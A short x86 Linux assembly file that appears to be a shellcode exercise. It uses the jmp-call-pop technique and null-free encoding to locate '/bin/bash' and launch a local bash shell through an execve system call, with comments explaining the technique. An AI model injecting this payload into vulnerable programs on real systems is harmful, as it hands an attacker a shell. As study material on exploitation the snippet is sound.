global _start			

section .text
_start:

  jmp short call_shellcode

shellcode:
  pop esi

  xor ebx,ebx
  mov byte [esi+9], bl ; we can't use nulls in ours shellcode, so we pop ABBBB and then replace it with 0 (null term) during execution
  mov dword [esi+10], esi
  mov dword [esi+14], ebx
  
  lea ebx, [esi] ; string pointing to /bin/bash
  lea ecx, [esi+10] ; address of /bin/bash
  lea edx, [esi+14]

  xor eax,eax
  mov al,0xb
  int 0x80
  
call_shellcode:
  call shellcode
  message db "/bin/bashABBBBCCCC" ; we define executable to start, then arguments and environment
